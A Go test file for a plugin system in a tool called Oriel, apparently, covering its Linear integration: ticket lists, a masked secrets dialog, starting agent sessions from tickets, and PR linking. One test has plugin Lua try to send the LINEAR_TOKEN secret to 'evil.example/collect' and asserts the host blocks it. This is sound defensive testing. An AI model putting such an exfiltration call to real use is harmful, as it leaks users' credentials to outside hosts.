package app

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/liamg/oriel/core"
	"github.com/liamg/oriel/ext"
	"github.com/liamg/oriel/gh"
	"github.com/liamg/oriel/integ/linear/lineartest"
	"github.com/liamg/oriel/registry"
	"github.com/liamg/oriel/render"
	"github.com/liamg/oriel/script"
)

// linearPlugin is the Linear plugin (integ/linear/plugin) as an install lays it out: its files, and its process
// built into bin/, granted what its manifest declares.
func linearPlugin(t *testing.T) ext.Plugin {
	t.Helper()
	dir, m := integPlugin(t, "linear", "oriel.toml", "init.lua")
	g := ext.NewGrants()
	g.Grant(m.ID, m.Permissions)
	return ext.Plugin{ID: m.ID, Dir: dir, Guard: g}
}

// linearConfig is the app reaching the recorded Linear for the internet, with secrets kept in a file of the test's.
func linearConfig(t *testing.T, l *lineartest.Linear) (func(*Config), *ext.SecretFile) {
	secrets := &ext.SecretFile{Path: filepath.Join(t.TempDir(), "secrets.json")}
	return func(cfg *Config) { cfg.Net, cfg.Secrets = l.Client(), secrets }, secrets
}

// loadLinear runs the plugin's init.lua in a VM of its own, as an installed plugin's.
func loadLinear(t *testing.T, s *errScene) *script.VM {
	t.Helper()
	p := linearPlugin(t)
	vm := s.pluginVM(t, p)
	src, err := os.ReadFile(filepath.Join(p.Dir, "init.lua"))
	if err != nil {
		t.Fatal(err)
	}
	if err := vm.Load(script.Chunk{Name: "init.lua", Source: src}); err != nil {
		t.Fatal(err)
	}
	s.frame()
	return vm
}

// crit-reference → Linear: "A list of assigned tickets", here the omnibox's tickets (ui.md 02: "`!` tickets"), from
// a recorded Linear API. Before there's a key the list asks for one; the key is pasted into Oriel's secrets dialog,
// shown as dots, and only Oriel sends it, to api.linear.app alone.
func TestLinearTicketsInTheOmnibox(t *testing.T) {
	l := lineartest.New(t)
	change, secrets := linearConfig(t, l)
	s := newSceneWith(t, "", "", mockupSize, change)
	loadLinear(t, s)

	s.run("omnibox.open", registry.Args{"query": "!"})
	s.until(t, "the ask for a key", func() bool { return strings.Contains(s.frameText(), "Set your Linear API key") })
	s.typeKeys("CR")
	s.until(t, "the secrets dialog", func() bool { return strings.Contains(s.frameText(), "Set LINEAR_TOKEN") })
	for _, r := range lineartest.Key {
		s.typeKeys(string(r))
	}
	if strings.Contains(s.fullText(), lineartest.Key) || !strings.Contains(s.frameText(), strings.Repeat("•", len(lineartest.Key))) {
		t.Errorf("the key shows as typed:\n%s", s.frameText())
	}
	s.typeKeys("CR")
	if v, ok := secrets.Secret("LINEAR_TOKEN"); v != lineartest.Key || !ok {
		t.Fatalf("the secret kept: %q, %v", v, ok)
	}

	s.run("omnibox.open", registry.Args{"query": "!"})
	s.until(t, "the tickets", func() bool { return strings.Contains(s.frameText(), "INF-2252") })
	text := strings.ReplaceAll(s.frameText(), "\n", "")
	order := []string{"INF-2231 Usage API returns stale prices after plan change", "INF-2240 Price cache invalidation on plan change",
		"INF-2219 Round minor units half-even, per currency", "INF-2252 Spot instance price lookup times out"}
	at := -1
	for _, want := range order {
		i := strings.Index(text, want)
		if i < at {
			t.Errorf("%q isn't in crit's order:\n%s", want, text)
		}
		at = i
	}
	for _, want := range []string{"TICKETS", "TODO", "IN PROGRESS", "BACKLOG", "PR #4398 · high", "blocked · high", "PR #530 · medium",
		"↵ starts work on it: a plan, the ticket its context"} {
		if !strings.Contains(text, want) {
			t.Errorf("the tickets lack %q:\n%s", want, text)
		}
	}
	if strings.Contains(text, "INF-2260") {
		t.Error("the duplicate is listed")
	}
	for _, a := range l.Auths() {
		if a != "api.linear.app "+lineartest.Key {
			t.Errorf("a request went as %q", a)
		}
	}
}

// crit-reference → Linear: "Start work from a ticket: the ticket, its comments and attachments become the plan
// prompt", and "Ticket state moves (to in progress on start …)". ui.md 04: "A pasted ticket ID expands into a card",
// against mockup 04: the ticket picked in the omnibox opens the launcher on Plan with its card, and starting it gives
// the agent the ticket with its comments and attachments, and moves the ticket into progress in Linear.
func TestLinearStartWorkFromATicket(t *testing.T) {
	l := lineartest.New(t)
	change, secrets := linearConfig(t, l)
	secrets.SetSecret("LINEAR_TOKEN", lineartest.Key)
	lw := newLocalWorker(t)
	if _, err := lw.client(t).AddRepoPath(context.Background(), lw.repo); err != nil {
		t.Fatal(err)
	}
	s := newSceneWith(t, "", "", mockupSize, func(cfg *Config) { lw.connect(t)(cfg); change(cfg) })
	s.now = at(14, 30, 0)
	st := waitState(t, s.store, "the worker", func(st core.State) bool { return len(st.Workers) == 1 })
	s.store.Apply(core.WorkerChanged{Worker: core.WorkerState{ID: st.Workers[0].ID, Name: "devbox", Connected: true, Cores: 32, CPU: .61}})
	loadLinear(t, s)
	// The test worker has no sandbox factory.
	if err := s.reg.Options().Set("sandbox.default", registry.LayerUser, registry.At{}, "host"); err != nil {
		t.Fatal(err)
	}

	s.run("omnibox.open", registry.Args{"query": "!INF-2231"})
	s.until(t, "the ticket", func() bool {
		return strings.Contains(s.frameText(), "Usage API returns stale prices after plan change")
	})
	s.typeKeys("CR")
	s.until(t, "the card", func() bool { return strings.Contains(s.frameText(), "linked PR #4398") })
	text := s.frameText()
	for _, want := range []string{"NEW SESSION", "from ticket · worker devbox", "INF-2231", "TODO", "Usage API returns stale prices after plan change",
		"Customers on the new Team plan", "2 attachments", "4 comments", "the ticket, comments and attachments go to the agent as context",
		"Start Plan"} {
		if !strings.Contains(text, want) {
			t.Errorf("the launcher lacks %q:\n%s", want, text)
		}
	}
	s.clickText(t, "+ add ▾")
	s.clickText(t, "pricing")
	s.typeKeysIn(t, "Confirm the cache is keyed by org first.", promptPlaceholder)
	s.lint("the launcher with a ticket")
	s.golden("launcher-ticket")

	s.run("session.launch", nil)
	s.until(t, "the session", func() bool { return !strings.Contains(s.frameText(), "NEW SESSION") })
	sent := lw.fake.WaitStarted(t).WaitSent(t)
	for _, want := range []string{"Confirm the cache is keyed by org first.", "Linear ticket INF-2231: Usage API returns stale prices after plan change",
		"## Comments (4)", "> Please keep the response shape: the CLI pins it.", "usage-stale-prices.har (412 KB)",
		"https://github.com/infracost/cloud/pull/4398"} {
		if !strings.Contains(sent.Text, want) {
			t.Errorf("the agent wasn't given %q:\n%s", want, sent.Text)
		}
	}
	s.until(t, "the ticket in progress", func() bool {
		for _, m := range l.Mutations() {
			in, _ := m.Vars["input"].(map[string]any)
			if m.Op == "issueUpdate" && m.Vars["id"] == "a3f9e2c1-0d44-4b7e-8f61-2c5d9b7e2231" && in["stateId"] == "6c1b3a8e-2d6f-4f0a-9a51-0b3f6f0f1a03" {
				return true
			}
		}
		return false
	})
	s.until(t, "the notice", func() bool { return strings.Contains(s.fullText(), "INF-2231 moved to In Progress in Linear") })
	for _, se := range s.store.State().Sessions {
		if se.Kind == core.KindPlan && se.Ticket != "INF-2231" {
			t.Errorf("the session's ticket is %q", se.Ticket)
		}
	}
}

// typeKeysIn clicks the field showing placeholder and types text into it.
func (s *errScene) typeKeysIn(t *testing.T, text, placeholder string) {
	t.Helper()
	s.clickText(t, placeholder)
	for _, r := range text {
		k := string(r)
		s.typeKeys(k)
	}
}

// crit-reference → Linear: "Ticket state moves (… to in review on PR) and links back to the PR", whoever raised it:
// a PR on the session's branch, read by the Ship page, is attached to the session's ticket and moves it into review.
func TestLinearPRLinkedBack(t *testing.T) {
	l := lineartest.New(t)
	change, secrets := linearConfig(t, l)
	secrets.SetSecret("LINEAR_TOKEN", lineartest.Key)
	s, _, hub, se, _ := shipScene(t, change)
	loadLinear(t, s)
	pr := hub.AddPR("acme/usage-api", gh.PR{Title: "feat: rate-limit headers", Head: se.Branch, Base: "main"})
	s.run("ship.refresh", nil)
	// The session's own start may move it into progress first; it ends in review either way.
	inReview := func() bool {
		m := l.Mutations()
		for i := len(m) - 1; i >= 0; i-- {
			if m[i].Op == "issueUpdate" {
				in, _ := m[i].Vars["input"].(map[string]any)
				return in["stateId"] == "6c1b3a8e-2d6f-4f0a-9a51-0b3f6f0f1a04"
			}
		}
		return false
	}
	s.shipSettle(t, "the PR linked and the ticket in review", inReview)
	var links []map[string]any
	for _, m := range l.Mutations() {
		if m.Op == "attachmentCreate" {
			in, _ := m.Vars["input"].(map[string]any)
			links = append(links, in)
		}
	}
	if len(links) != 1 || links[0]["url"] != pr.URL || links[0]["issueId"] != "a3f9e2c1-0d44-4b7e-8f61-2c5d9b7e2231" ||
		links[0]["title"] != "#"+itoa(pr.Number)+" feat: rate-limit headers" {
		t.Errorf("the links: %+v", links)
	}
	s.until(t, "the notice", func() bool { return strings.Contains(s.fullText(), "INF-2231 moved to In Review in Linear") })

	// Read again, the PR is old news: nothing more is sent.
	sent := len(l.Mutations())
	s.run("ship.refresh", nil)
	s.shipSettle(t, "a second read", func() bool { return true })
	time.Sleep(100 * time.Millisecond)
	s.sh.runTodo()
	if n := len(l.Mutations()); n != sent {
		t.Errorf("%d changes after a second read, %d before", n, sent)
	}
}

// crit-reference → Linear: "A company feed of Linear moves": the workspace's moves and new tickets of the last two
// days, newest first, as a panel of the HUD.
func TestLinearMovesInTheHUD(t *testing.T) {
	l := lineartest.New(t)
	change, secrets := linearConfig(t, l)
	secrets.SetSecret("LINEAR_TOKEN", lineartest.Key)
	s := newSceneWith(t, "", "", mockupSize, change)
	loadLinear(t, s)
	s.hold(render.ModAlt, 300*time.Millisecond)
	s.until(t, "the moves", func() bool { return strings.Contains(s.frameText(), "INF-2190") })
	text := s.frameText()
	for _, want := range []string{"LINEAR", "20m", "INF-2219", "In Progress → In Review", "priya", "INF-2244", "created", "ben",
		"Backlog → Todo", "In Review → Done"} {
		if !strings.Contains(text, want) {
			t.Errorf("the HUD lacks %q:\n%s", want, text)
		}
	}
	if strings.Index(text, "INF-2219") > strings.Index(text, "INF-2190") {
		t.Error("the moves aren't newest first")
	}
}

// security.md: "The plugin calls oriel.http.get(url, { auth = "LINEAR_TOKEN" }); the host injects the header, and
// only if the request goes to api.linear.app." From the plugin's Lua: the answer comes back, the key never does, and
// the key can't be sent anywhere else.
func TestLuaHTTPWithASecret(t *testing.T) {
	l := lineartest.New(t)
	change, secrets := linearConfig(t, l)
	secrets.SetSecret("LINEAR_TOKEN", lineartest.Key)
	s := newSceneWith(t, "", "", mockupSize, change)
	m, err := ext.LoadManifest(filepath.Join("..", "integ", "linear", "plugin"))
	if err != nil {
		t.Fatal(err)
	}
	g := ext.NewGrants()
	g.Grant(m.ID, m.Permissions)
	vm := s.pluginVM(t, ext.Plugin{ID: m.ID, Dir: t.TempDir(), Guard: g})
	s.frame()
	if err := luaErr(t, vm, `
oriel.http.request({ url = "https://api.linear.app/graphql", method = "POST", body = '{"query":"{ viewer { assignedIssues { nodes { id } } } }"}',
  headers = { ["Content-Type"] = "application/json" }, auth = "LINEAR_TOKEN", auth_scheme = "none" }, function(res, err) got, failed = res, err end)
oriel.http.request({ url = "https://evil.example/collect", auth = "LINEAR_TOKEN" }, function(res, err) evil = err end)
oriel.http.request({ url = "https://evil.example/collect" }, function(res, err) plain = err end)`); err != "" {
		t.Fatal(err)
	}
	s.until(t, "the answers", func() bool {
		return global(vm, "got") != nil && global(vm, "evil") != nil && global(vm, "plain") != nil
	})
	if st := global(vm, "got.status"); st != 200.0 {
		t.Errorf("status %v, failed %v", st, global(vm, "failed"))
	}
	if body, _ := global(vm, "got.body").(string); !strings.Contains(body, "assignedIssues") || strings.Contains(body, lineartest.Key) {
		t.Errorf("body %q", body)
	}
	if e, _ := global(vm, "evil").(string); !strings.Contains(e, `isn't declared for evil.example`) {
		t.Errorf("the key to another host: %q", e)
	}
	if e, _ := global(vm, "plain").(string); !strings.Contains(e, `"net" capability isn't declared for evil.example`) {
		t.Errorf("another host at all: %q", e)
	}
	for _, a := range l.Auths() {
		if !strings.HasPrefix(a, "api.linear.app ") {
			t.Errorf("a request reached %q", a)
		}
	}
}
